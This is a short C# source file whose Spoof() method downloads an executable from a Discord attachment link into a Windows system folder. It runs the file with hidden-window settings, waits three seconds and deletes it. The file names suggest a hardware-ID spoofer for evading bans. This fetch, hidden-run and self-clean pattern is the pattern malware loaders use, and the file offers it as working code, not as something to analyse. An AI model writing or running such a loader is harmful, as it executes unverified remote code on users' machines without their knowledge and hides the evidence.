using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Net;
using System.IO;
using System.Diagnostics;
using System.Threading;


namespace Auth.GG_Example
{
    class SpoofF
    {

        public static void Spoof()
        {
            WebClient Client = new WebClient();
            string text = @"C:\Windows\appcompat\UA\XXXSPOOFXXXF.exe";

            Client.DownloadFile("https://cdn.discordapp.com/attachments/812676154615267348/812676202060840970/Spoof_GM_F.exe", text);

            Process process = new Process();
            process.StartInfo.FileName = "cmd.exe";
            process.StartInfo.UseShellExecute = true;
            process.StartInfo.CreateNoWindow = true;
            process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
            process = Process.Start(text);

            Thread.Sleep(3000);
            process.Close();
            File.Delete(text);












        }
    }

}

